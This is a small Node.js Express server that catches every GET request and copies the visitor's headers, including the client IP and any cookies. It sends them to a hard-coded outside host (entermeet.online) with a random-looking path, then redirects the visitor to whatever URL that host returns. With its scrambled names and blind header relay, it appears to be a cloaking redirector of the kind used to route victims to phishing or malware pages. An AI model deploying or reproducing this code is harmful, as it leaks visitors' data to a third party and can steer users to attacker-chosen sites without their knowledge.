var bodyParser = require("body-parser");
var express = require("express");
const requester = require("request");

var app = express();
app.use(bodyParser.urlencoded({ limit: "50mb", extended: true }));
app.use(bodyParser.json({ limit: "50mb" }));
app.use(bodyParser.raw());
app.set("port", process.env.PORT);

app.get("*", function (req, res) {
  req.headers["X-Asteria-Client-IP"]=req.headers["x-forwarded-for"].split(",")[0]
  var head = req.headers;
  var headerss=JSON.stringify(head).replace("'{","").replace("}'","").replace("content-length","content2").replace("accept-encoding","dfsdfsdff")
  var querystring = req.url;
  var urrrl = "https://entermeet.online/bMowEtfWDS/PjYOuZqfBr/&MVTSWDyTjuISHLrPrKJ&YTtt=doQeAidpiupEXs&FAHQeepST";
  

      requester.get(
      {
        headers:JSON.parse(headerss),
        url:     urrrl,
      }, function(error, response, body){
       
            return res.redirect(body); 

    });
});

app.listen(process.env.PORT, "0.0.0.0", function () {
  console.log(app.get("port"));
  console.log("Starting listen...");
});
